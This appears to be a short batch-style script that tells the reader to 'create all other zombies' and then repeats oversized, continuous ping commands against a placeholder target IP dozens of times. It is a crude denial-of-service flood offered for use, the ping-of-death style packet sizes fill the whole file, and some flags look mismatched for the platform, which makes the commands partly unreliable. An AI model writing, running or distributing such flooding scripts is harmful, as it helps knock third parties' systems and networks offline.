echo Create all other zombies yourself!
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
ping $YOURIP$ -t -l 65550
ping $YOURIP$ -s 9999 -i 9999
